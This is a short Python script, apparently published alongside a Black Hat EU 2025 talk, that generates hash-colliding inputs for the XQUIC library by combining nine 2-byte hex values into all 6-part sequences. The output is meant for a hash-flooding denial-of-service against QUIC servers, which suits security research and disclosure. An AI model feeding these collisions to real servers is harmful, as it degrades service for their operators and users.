# gen_collisions.py
# Equivalent substring collision generator for XQUIC hash function
# Author: Paul Bottinelli
# For Black Hat EU 2025 - Cut to the QUIC: Slashing QUIC's Performance with a Hash DoS
#
# This script generates colliding inputs using carefully chosen 2-byte hex strings
# that produce equivalent substrings under XQUIC's hash function.

import itertools

# List of 2-byte hex strings that create equivalent substrings under XQUIC's hash
# These values were identified through analysis of XQUIC's hash function properties
hex_values = ["00ff", "01e0", "02c1", "03a2", "0483", "0564", "0645", "0726", "0807"]

# Generate all 6-length permutations (with repetition)
for combo in itertools.product(hex_values, repeat=6):
    # Concatenate and print the result
    print("".join(combo))
